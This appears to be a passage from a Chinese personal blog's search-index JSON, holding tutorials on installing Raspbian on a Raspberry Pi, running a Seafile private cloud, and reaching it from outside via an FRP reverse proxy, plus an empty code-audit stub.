gitlab的安装使用：https://kn0sky.com/2019/08/30/git/gitlab/","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"树莓派","slug":"折腾笔记/树莓派","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/"}]},{"title":"让树莓派有点事做03--外网访问","date":"2019-06-01T01:30:11.000Z","path":"wiki/折腾笔记/树莓派/让树莓派有点事做03--外网访问/","text":"让树莓派有点事做03–外网访问前言经过前面我们对树莓派进行系统安装，架设私有云服务之后，我们发现这里存在一个问题：我们可以把树莓派当做个人网盘，但是却又只能在局域网里使用，这样一来，我们使用树莓派也只能在宿舍、家里或者办公室这样一个小范围区域，如果我们想要通过外网对树莓派进行访问，那有没有什么解决方案呢？当然是有的，接下来将向大家介绍一种外网访问树莓派的姿势。 准备阶段 Raspberry Pi 3B+（安装系统请参考：https://kn0sky.github.io/2019/04/15/rpi/rpi-1/） 一台有公网IP的服务器（这里我用的10元/月的学生云） 一个域名（已备案） FRP工具（ https://github.com/fatedier/frp/releases ） 废话几句看到这里，你可能会想，我要是有公网IP的云服务器，我为啥还要用树莓派运行云盘服务呢？如果你的云服务器是专门拿来做云盘服务的话，直接拿云服务器做就行了。但是如果不是这样，云服务器还有其他的工作，那我们可以用云服务器进行代理转发，在尽量不占云服务器资源的前提下，让我们可以通过云服务器的转发访问我们内网里的树莓派。 接下来进入正题，内网穿透：外网访问树莓派 内网穿透：从外网访问树莓派这里我们要介绍一个内网穿透的工具：FRP FRP 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透。 在github上的官网文档里，有很多的使用示例，有兴趣的朋友可以自行了解，地址我放在文末参考链接里了 这里我们就我们当前关心的问题（如何通过外网访问树莓派的seafile私有云服务）进行演示 服务端安装配置首先，我们需要准备一个有固定外网ip的云服务器，和一个域名这里我用的是学生云服务器（10元/月），注册了一个域名 我们打开云服务器的终端通过wget命令下载frp工具 123#wget用法：~$ wget uri 具体uri地址需要到FRP的release页面去找你安装的系统对应的工具（https://github.com/fatedier/frp/releases ） 找到后，右键你要下载的工具，选择复制链接地址后，黏贴到命令中 123#例如我的云服务器是64位linux的，我就下载这个~$ wget https://github.com/fatedier/frp/releases/download/v0.27.0/frp_0.27.0_linux_amd64.tar.gz 下载好之后，进行解压 1tar xvf frp_0.27.0_linux_amd64.tar.gz 完成后，进入该目录 12345# 进入目录ubuntu@VM-0-17-ubuntu:~$ cd frp_0.27.0_linux_amd64/# 查看文件列表ubuntu@VM-0-17-ubuntu:~/frp_0.27.0_linux_amd64$ lsfrpc frpc_full.ini frpc.ini frps frps_full.ini frps.ini LICENSE systemd 这里我们需要编辑一个配置文件frps.ini,修改成如下内容 123[common]bind_port = 7000 vhost_http_port = 8000 这里的bind_port是服务端和客户端连接用的端口这里的vhost_http_port是对外开放访问的端口 设置完之后，在当前frp目录执行命令./frps -c frps.ini即可启动服务端侦听 客户端安装配置客户端同样从frp的github的release页面下载相应的工具，解压，进入工具的目录（注意：树莓派需要下载的版本是linux_arm） 客户端同样也需要进行配置文件的修改 打开配置文件frpc.ini，里面的默认配置如下 12345678910# frpc.ini[common]server_addr = x.x.x.xserver_port = 7000[ssh]type = tcplocal_ip = 127.0.0.1local_port = 22remote_port = 6000 我们需要将[common]里的x.x.x.x修改为我们自己的云服务器的ip然后将[ssh]这几行全都注释掉，之后添加我们部署的私有云服务的相关配置，具体添加修改如下 1234567891011121314[common]server_addr = x.x.x.xserver_port = 7000#[ssh]#type = tcp#local_ip = 127.0.0.1#local_port = 22#remote_port = 6000[seafile]type = httplocal_port = 8000custom_domains = www.domain.com 这里需要将x.x.x.x和custom_domains修改成云服务器的ip和域名local_port指的是我们树莓派本地seafile的Web服务开放的端口 修改完成之后，保存，在当前frp目录执行命令./frpc -c frpc.ini即可连接到我们的服务器 当我们在服务端看到如下信息时，则说明连接成功 12019&#x2F;05&#x2F;24 11:00:54 [I] [control.go:398] [ea4809994462e7ef] new proxy [seafile] success 这时候，我们通过域名去访问我们内网的树莓派即可访问成功 遇到的两个坑在整个过程中，我遇到了两个坑，首先，我把服务端和客户端都配置好之后，发现客户端连接不上服务端，访问服务端的8000端口出现404，经过检查网络连接，发现这是云服务器的安全组设置的问题，在云服务器的控制台将7000端口和8000端口加入入站规则，这样就能连接成功了，同时也能够从http://域名:8000访问我的树莓派了。 其次是一个小问题，当我们从ssh连接linux终端的时候，当我们关掉ssh连接的窗口，正在执行的命令会被中断，这里可以用nohup工具进行很好的解决，具体使用方法可以参考 https://www.cnblogs.com/baby123/p/6477429.html 最后说几句seafile官网有提供各个平台的app，有需要可以去下载使用，手机app可以更方便的连接到我们的树莓派上，个人感觉挺方便的，有兴趣的同学可以去尝试体验体验 seafile出了一个增强版，seafileDocs，增加了包括在线 Markdown 所见即所得写作，文档评审流程，实时协同，维基视图等新功能。，有兴趣的同学可以去官网了解下：https://www.seafile.com/seafile-docs/home/ 本系列文章属于不定期更新，大家不要催更啦～有问题欢迎大家留言或者私信与我交流～ 参考资料FRP：https://github.com/fatedier/frpnohup：https://www.cnblogs.com/baby123/p/6477429.htmlseafile：https://www.seafile.com/home/","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"树莓派","slug":"折腾笔记/树莓派","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/"}]},{"title":"让树莓派有点事做02--私有云服务","date":"2019-05-01T01:30:11.000Z","path":"wiki/折腾笔记/树莓派/让树莓派有点事做02--私有云服务/","text":"让树莓派有点事做02–私有云服务前言这是《让树莓派有点事做》系列第二篇：使用树莓派搭建一个私有云，私人的存储空间良好的使用体验，有兴趣的你，不容错过！ 准备阶段主机 Ubuntu 18.04 LTS 系统 硬件 上一节装好系统的树莓派 软件 seafile服务器包（https://github.com/haiwen/seafile-rpi/releases） 安装下载seafile服务器包接下来将文件压缩包上传到树莓派中 123456$ cd /media/kn0sky/kn0sky_lab/rpi/ #到刚才解压的文件的上一级目录$ sftp pi@192.168.2.222 #sftp连接树莓派pi@192.168.2.222's password: #输入密码 Connected to 192.168.2.222. # 连接成功sftp&gt; put -R seafile-server_6.3.4_stable_pi.tar.gz #上传文件压缩包# 稍等片刻即可完成 接下来通过ssh登录树莓派（登录方法在上一节已讲述，在此不再啰嗦），解压压缩包： 1$ tar -xvf seafile-server_6.3.4_stable_pi.tar.gz 进入刚解压的文件夹 1$ cd seafile-server-6.3.4/ 运行安装脚本 1$ ./setup-seafile.sh 这里会提示我们有什么需要提前安装的我们还没安装，并给出安装提示 我们按照提示来安装，因为树莓派官方的系统是基于Debian的，所以我们运行Debian的那一行命令 1$ sudo apt install python-setuptools 因为使用apt包管理工具需要使用root权限，所以需要在命令前面加个sudo 由于有很多东西需要提前安装，所以在此给出需要安装的文件，大家复制进去直接安装即可 12sudo apt updatesudo apt install python2.7 libpython2.7 python-setuptools python-ldap python-urllib3 sqlite3 python-requests python-imaging 稍等片刻，安装即可完成 然后接着运行安装脚本 1$ ./setup-seafile.sh 这时，会提示你输入一些你的配置选项 选项 描述 注意 服务器名称 此Seafile服务器的名称 3-15个字符，仅允许英文字母，数字和下划线（'_'） 服务器IP或域 此服务器使用的IP地址或域名 Seafile客户端程序将使用此地址访问服务器 Seafile数据目录 Seafile将您的数据存储在此目录中。默认情况下，它将放在当前目录中。 随着您将越来越多的数据放入Seafile，此目录的大小将会增加。请选择具有足够可用空间的磁盘分区。 文件服务器端口 Seafile文件服务器使用的TCP端口 默认值为8082.如果已被其他服务使用，则可以将其设置为其他端口。 服务器名称：随便取就行服务器IP或域：局域网的话，输入树莓派的ip就行数据目录：这个是设置保存数据的位置，默认是[default: /home/pi/seafile-data ]文件服务器端口:设置文件服务器使用的TCP端口，一般默认8002就行 设置完成后 点击回车键继续 安装完成后会有如下提示 seafile服务使用脚本进行操作 12./seafile.sh &#123; start | stop | restart &#125;./seahub.sh &#123; start &lt;port&gt; | stop | restart &lt;port&gt; &#125; 如果服务器有防火墙，需要开放8082和8000端口 使用到这里，需要解释一下seafile 和seahub分别是什么seafile是文件服务器的服务seahub是网站 接下来，我们启动服务和网站： 启动服务 1$ ./seafile.sh start 启动网站 1$ ./seahub.sh start 这里要求填写管理员邮箱来注册管理员账号然后会要求填写密码填写完成之后，管理员创建成功 网站成功启动 现在我们打开网站看一看 进入浏览器输入url：192.168.2.222:8000（ip地址是自己树莓派在局域网的ip） 输入我们刚才注册的管理员账号（邮箱）和密码登录 成功进入我们的私有云（seafile） 上传一个文件试一试： 可见上传速度还是挺不错的，最高在20M/s,最低在7M/s 至于更多其他功能，大家有兴趣的话可以自己装一个去体验体验，或者是去查查官方文档看一看（https://manual.seafile.com/） 最后这个时候，可能很多人就会想，树莓派性能支撑的住吗？网页会不会卡或者响应慢呢？我们先来看一看树莓派的内存使用： 内存剩余还多 使用top来查看一下性能的使用： cpu占用也不是很高！ 总结使用seafile来做树莓派的文件服务还是挺不错的，有兴趣一定要体验体验，我记得以前我在树莓派上部署NextCloud来把树莓派当网盘使用的时候，使用体验不是很好，一直有很卡的感觉。可能是因为seafile有专门的树莓派版本，所以更加适合树莓派使用。 ～有问题欢迎大家留言或者私信我～","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"树莓派","slug":"折腾笔记/树莓派","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/"}]},{"title":"让树莓派有点事做01--安装系统","date":"2019-04-15T01:30:11.000Z","path":"wiki/折腾笔记/树莓派/让树莓派有点事做01--安装系统/","text":"让树莓派有点事做01–安装系统前言看着自己那个还在落灰的树莓派，总觉得不用有点浪费，树莓派能做点啥呢？以前我在树莓派上部署lamp或者lnmp来安装一些网站例如WordPress，nextcloud之类的，总是感觉有点卡卡的，树莓派可能性能不够，但是我又不想超频，毕竟不懂怎么给树莓派降温。树莓派是很流行的卡片电脑，应该会有很多专门适合树莓派的各种服务，这一次，让我们来探索探索那些有树莓派专用的且使用体验好的服务软件，让树莓派成为家里或者宿舍里的专用服务器！这次我将写一个系列文章来介绍树莓派上好用有趣的各种服务！《让树莓派有点事做》系列正式开篇！本系列阅读门槛较低，有问题欢迎大家留言或者私信我～ 准备阶段主机 Ubuntu 18.04 LTS 系统 硬件 Raspberry Pi 3B+ SD读卡器 SD卡 网线 软件 Etcher（https://www.balena.io/etcher/） Raspberry Pi 官方系统镜像（https://www.raspberrypi.org/downloads/） 开搞！将下载好的镜像解压，考虑到树莓派性能问题，这里我选择的是Raspbian Stretch Lite系统没有图形界面和杂七杂八的软件 下载好之后，解压 然后打开我们刚下载的Etcher 选择我们刚刚解压的镜像 然后点击Flash！开始烧录 稍等片刻，即可完成 接下来，我们向sd卡的boot目录里创建一个空文件ssh（这是我踩的第一个坑，开机使用ssh连接不上，实际上只需要在boot目录下创建一个空文件ssh就行，这样树莓派可以开机的时候自动启动ssh服务供我们连接使用） 12$ cd /media/kn0sky/boot (这里路径根据自己的情况选择)$ touch ssh 然后我们就可以启动树莓派了！ 先将读卡器拔出，将sd卡插入树莓派，给树莓派接上网线，将树莓派通电开机 稍等片刻 登录路由器后台查看ip地址（大家的路由器可能各不相同，登录进去后的页面也有所不同，但都能找到ip地址） 不难找到，我的树莓派的ip地址为192.168.2.222 接下来通过ssh连接树莓派 123456$ ssh pi@192.168.2.222The authenticity of host '192.168.2.222 (192.168.2.222)' can't be established.ECDSA key fingerprint is SHA256:w7TtiJ0TlE/tkWjQPhF4IclfWXrmA7adqbG2xDKIH2g.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '192.168.2.222' (ECDSA) to the list of known hosts.pi@192.168.2.222's password: 树莓派默认账号：pi树莓派默认密码：raspberry 输入完密码后，成功登录进入树莓派树莓派的系统安装就此完成！ 下一节我们将介绍：树莓派架设私有云（seafile） ～有问题欢迎大家留言或者私信我～","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"树莓派","slug":"折腾笔记/树莓派","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/"}]},{"title":"","date":"1970-01-01T00:00:00.000Z","path":"wiki/审计笔记/CMS审计/6KZZv1.4/main/","text":"代码审计练习–6KZZ快站v1.4环境： PHP5","tags":[],"categories":[{"name":"审计笔记","slug":"审计笔记","permalink":"http://kn0sky.com/categories/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"name":"CMS审计","slug":"审计笔记/CMS审计","permalink":"http://kn0sky.com/categories/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/CMS%E5%AE%A1%E8%AE%A1/"},{"name":"6KZZv1.4","slug":"审计笔记/CMS审计/6KZZv1-4","permalink":"http://kn0sky.com/categories/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/CMS%E5%AE%A1%E8%AE%A1/6KZZv1-4/"}]}]}